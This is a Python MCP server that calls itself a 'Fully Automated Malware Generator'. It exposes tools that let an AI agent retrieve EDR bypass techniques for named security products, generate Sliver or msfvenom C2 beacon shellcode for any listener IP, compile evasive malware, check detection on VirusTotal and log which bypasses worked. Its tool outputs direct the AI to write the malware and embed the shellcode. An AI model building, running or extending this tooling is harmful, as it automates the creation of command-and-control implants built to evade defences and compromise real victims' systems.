#!/usr/bin/env python3
"""
Noctis MCP v3.0 - Fully Automated Malware Generator
5 Core Tools for Dynamic Malware Generation
"""
import sys
import os
import requests
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from fastmcp import FastMCP
except ImportError:
    print("[!] FastMCP not installed: pip install fastmcp")
    sys.exit(1)

mcp = FastMCP("Noctis-MCP-v3")
SERVER_URL = "http://localhost:8888"


@mcp.tool()
def noctis_get_edr_bypasses(target_edr: str) -> str:
    """
    Get bypass techniques for specific EDR.

    Args:
        target_edr: EDR name (CrowdStrike, Defender, SentinelOne, etc.)

    Returns:
        Techniques that work against this EDR with code snippets
    """
    try:
        response = requests.post(f"{SERVER_URL}/api/get_bypasses",
                                json={"edr": target_edr}, timeout=30)

        if response.status_code == 200:
            data = response.json()

            output = []
            output.append("=" * 70)
            output.append(f"  EDR BYPASSES: {target_edr}")
            output.append("=" * 70)
            output.append("")
            output.append(f"Recommended Techniques:")
            for i, tech in enumerate(data.get('techniques', []), 1):
                output.append(f"  {i}. {tech}")
            output.append("")
            output.append(f"Code Snippets:")
            for snippet in data.get('snippets', []):
                output.append(f"\n{snippet}")
            output.append("")
            output.append("=" * 70)
            output.append("Next: AI writes malware code using these techniques")
            output.append("=" * 70)

            return "\n".join(output)
        else:
            return f"ERROR: {response.text}"
    except Exception as e:
        return f"ERROR: Server not running. Start with: python server/noctis_server.py\n{e}"


@mcp.tool()
def noctis_generate_beacon(
    c2_type: str,
    listener_ip: str,
    listener_port: int = 443,
    architecture: str = "x64"
) -> str:
    """
    Generate C2 beacon shellcode with ANY IP address.

    Args:
        c2_type: "sliver" or "msfvenom"
        listener_ip: IP address (10.0.0.1, 192.168.1.5, public IP, etc.)
        listener_port: Port (default 443)
        architecture: "x64" or "x86"

    Returns:
        Shellcode in C array format ready to paste into code
    """
    try:
        response = requests.post(f"{SERVER_URL}/api/generate_beacon",
                                json={
                                    "c2_type": c2_type,
                                    "listener_ip": listener_ip,
                                    "listener_port": listener_port,
                                    "architecture": architecture
                                }, timeout=90)

        if response.status_code == 200:
            data = response.json()

            if not data.get('success'):
                return f"ERROR: {data.get('error')}\nHint: {data.get('hint', '')}"

            output = []
            output.append("=" * 70)
            output.append(f"  BEACON GENERATED: {c2_type.upper()}")
            output.append("=" * 70)
            output.append(f"Listener: {data['listener']}")
            output.append(f"Architecture: {data['architecture']}")
            output.append(f"Shellcode Size: {data['shellcode_size']} bytes")
            output.append(f"File: {data['shellcode_path']}")
            output.append("")
            output.append("C Array (copy this into your code):")
            output.append("-" * 70)
            output.append(data['c_array'])
            output.append("-" * 70)
            output.append("")
            output.append("=" * 70)
            output.append("Next: AI integrates this shellcode into malware code")
            output.append("=" * 70)

            return "\n".join(output)
        else:
            return f"ERROR: {response.text}"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_compile(
    source_file: str,
    target_edr: str = "generic",
    architecture: str = "x64"
) -> str:
    """
    Compile malware with EDR-specific optimizations.

    Args:
        source_file: Path to .c file (e.g., "my_beacon.c")
        target_edr: Target EDR for optimizations
        architecture: "x64" or "x86"

    Returns:
        Compiled binary path and details
    """
    try:
        response = requests.post(f"{SERVER_URL}/api/compile",
                                json={
                                    "source_file": source_file,
                                    "target_edr": target_edr,
                                    "architecture": architecture
                                }, timeout=120)

        if response.status_code == 200:
            data = response.json()

            if not data.get('success'):
                return f"ERROR: {data.get('error')}\nLogs:\n{data.get('logs', '')}"

            output = []
            output.append("=" * 70)
            output.append(f"  COMPILATION SUCCESSFUL")
            output.append("=" * 70)
            output.append(f"Source: {data['source_file']}")
            output.append(f"Binary: {data['binary_path']}")
            output.append(f"Size: {data['binary_size']} bytes")
            output.append(f"Target EDR: {target_edr}")
            output.append(f"Architecture: {architecture}")
            output.append("")
            output.append("Compiled with techniques:")
            for tech in data.get('techniques', []):
                output.append(f"  - {tech}")
            output.append("")
            output.append("=" * 70)
            output.append("Next: Test beacon connection or test on VT")
            output.append("=" * 70)

            return "\n".join(output)
        else:
            return f"ERROR: {response.text}"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_test_binary(
    binary_path: str,
    target_edr: str
) -> str:
    """
    Test binary on VirusTotal (PROTOTYPES ONLY!).

    Args:
        binary_path: Path to compiled binary
        target_edr: Check if this EDR detects it

    Returns:
        Detection results
    """
    try:
        response = requests.post(f"{SERVER_URL}/api/test_binary",
                                json={
                                    "binary_path": binary_path,
                                    "target_edr": target_edr
                                }, timeout=360)

        if response.status_code == 200:
            data = response.json()

            if not data.get('success'):
                return f"ERROR: {data.get('error')}"

            output = []
            output.append("=" * 70)
            output.append(f"  VIRUSTOTAL RESULTS")
            output.append("=" * 70)
            output.append(f"Binary: {data['binary']}")
            output.append(f"Detection: {data['detection_rate']}")
            output.append(f"{target_edr}: {data['target_edr_result']}")
            output.append("")
            output.append("Top Detections:")
            for detection in data.get('top_detections', []):
                output.append(f"  - {detection}")
            output.append("")
            output.append("=" * 70)
            output.append("⚠️  Remember: Test prototypes only, NOT final binary!")
            output.append("=" * 70)

            return "\n".join(output)
        else:
            return f"ERROR: {response.text}"
    except Exception as e:
        return f"ERROR: {str(e)}"


@mcp.tool()
def noctis_record_result(
    target_edr: str,
    detected: bool,
    techniques: str,
    notes: str = ""
) -> str:
    """
    Record test result for learning system.

    Args:
        target_edr: EDR tested against
        detected: True if caught, False if bypassed
        techniques: Comma-separated techniques used
        notes: Additional notes

    Returns:
        Updated statistics
    """
    try:
        tech_list = [t.strip() for t in techniques.split(',')]

        response = requests.post(f"{SERVER_URL}/api/record_result",
                                json={
                                    "target_edr": target_edr,
                                    "detected": detected,
                                    "techniques": tech_list,
                                    "notes": notes
                                }, timeout=30)

        if response.status_code == 200:
            data = response.json()

            status = "✗ DETECTED" if detected else "✓ BYPASSED"

            output = []
            output.append("=" * 70)
            output.append(f"  RESULT RECORDED: {status}")
            output.append("=" * 70)
            output.append(f"EDR: {target_edr}")
            output.append(f"Techniques: {techniques}")
            output.append(f"Notes: {notes if notes else 'None'}")
            output.append("")
            output.append(f"Updated Statistics:")
            output.append(f"  Total Tests: {data.get('total_tests', 0)}")
            output.append(f"  Bypass Rate: {data.get('bypass_rate', 0)}%")
            output.append("")
            output.append("=" * 70)
            output.append("System learning updated - recommendations improved!")
            output.append("=" * 70)

            return "\n".join(output)
        else:
            return f"ERROR: {response.text}"
    except Exception as e:
        return f"ERROR: {str(e)}"


if __name__ == "__main__":
    print("[*] Noctis MCP v3.0 Starting...")
    print("[*] Server URL:", SERVER_URL)
    mcp.run(transport='stdio')
